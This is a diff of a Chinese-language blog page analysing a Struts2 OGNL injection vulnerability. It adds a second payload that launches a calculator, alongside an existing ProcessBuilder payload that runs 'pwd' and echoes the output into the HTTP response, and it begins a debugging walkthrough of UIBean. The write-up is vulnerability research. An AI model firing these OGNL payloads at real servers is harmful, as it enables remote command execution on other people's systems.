@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    835 字
+                    850 字
                   </span>
                 
 
@@ -186,6 +186,8 @@
 <p>所以漏洞可以在用于页面渲染的变量可控的情况下触发，比如传一个 username，然后 struts 又把这个 username 贴回模板里的时候。</p>
 <p>贴一个命令执行的 payload：</p>
 <pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre><p>还有：</p>
+<pre><code>%{(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;deepin-calculator&quot;})).start()}
 </code></pre><p>比 spel 的反射链命令执行好看很多。</p>
 <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>不熟悉 struts 和 tomcat 的流程，按照他渲染肯定要获取 username 的想法，给 getUsername 下断点来调试，找到 UIBean.class 的 end 函数：</p>
 <pre><code class="java">public boolean end(Writer writer, String body) {
